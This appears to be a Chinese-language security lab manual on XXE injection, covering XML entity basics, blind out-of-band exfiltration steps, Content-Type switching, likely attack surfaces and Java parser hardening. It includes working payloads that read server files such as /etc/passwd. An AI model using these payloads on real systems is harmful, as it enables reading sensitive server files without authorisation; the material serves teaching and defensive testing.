# 🧠 实验手册：XXE 外部实体注入

### 0. 序言
XML 看起来只是数据格式，但它的规范中隐藏着一个强大且危险的功能——**外部实体（External Entity）**。攻击者可以利用它让 XML 解析器去读取服务器上的文件、发起网络请求，甚至造成拒绝服务。

*   **XXE（XML External Entity）**：利用 XML 解析器处理外部实体声明的特性，在服务端执行非预期操作。
*   **核心思想**：XML 不只是数据，它还能"命令"解析器去获取外部资源。

本章目标：**学会识别 XML 解析点，并利用外部实体读取服务器上的敏感文件。**

---

### 1. XML 与 DTD 基础

**XML 文档结构**：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!-- 这里是 DTD 声明区 -->
]>
<root>
  <element>内容</element>
</root>
```

**实体声明**：
```xml
<!DOCTYPE root [
  <!ENTITY name "Hello World">
]>
<root>&name;</root>
<!-- 解析后: <root>Hello World</root> -->
```

**外部实体** — 这就是 XXE 的核心：
```xml
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
<!-- 解析器会读取 /etc/passwd 文件内容并填入 -->
```

---

### 2. 基础 XXE — 文件读取

**攻击场景**：任何接受 XML 输入并解析的接口。

**Payload 模板**：
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///path/to/secret">
]>
<data>
  <field>&xxe;</field>
</data>
```

**前提条件**：
- 服务端解析 XML 输入
- 解析器未禁用外部实体
- 解析结果有回显

---

### 3. 盲 XXE — OOB 外带

**问题**：如果服务端解析了 XML 但不回显内容怎么办？

**解决方案**：利用参数实体（Parameter Entity）将数据通过 HTTP 请求"带出来"。

**参数实体语法**：
```xml
<!ENTITY % name "value">
%name;   <!-- 在 DTD 中引用 -->
```

**OOB 外带流程**：
1. 解析器读取目标文件到 `%file`
2. 加载远程 DTD
3. DTD 中构造新实体，将 `%file` 内容拼入 URL
4. 解析器访问该 URL → 数据被"带出"

---

### 4. Content-Type 切换攻击

**发现思路**：有些 API 表面上只接受 JSON，但后端框架同时支持 XML。

**识别方法**：
```
1. 正常请求：Content-Type: application/json
2. 尝试修改为：Content-Type: application/xml
3. 将 JSON body 改写为含 XXE 的 XML
```

---

### 5. 识别 XXE 攻击面

**哪些地方可能存在 XML 解析？**
- 文件上传（SVG、DOCX、XLSX 都是 XML）
- SOAP 接口
- RSS/Atom 订阅
- 配置导入功能
- API 接口（可能隐藏 XML 支持）
- SAML 认证

---

### 6. 防御措施

**禁用外部实体**（Java 示例）：
```java
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

---

**[准备好了吗？去探索那些 XML 解析器的"隐藏功能"吧]**
